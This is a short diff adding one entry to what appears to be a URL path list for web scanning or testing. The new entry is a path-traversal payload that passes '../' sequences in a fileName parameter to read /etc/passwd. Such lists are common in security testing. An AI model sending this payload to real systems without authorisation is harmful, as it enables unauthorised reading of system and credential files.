@@ -84,3 +84,4 @@
 /api/v1/users
 /wp-content/plugins/qubely/readme.txt
 /
+/api/downloads?fileName=../../../../../../../../etc/passwd
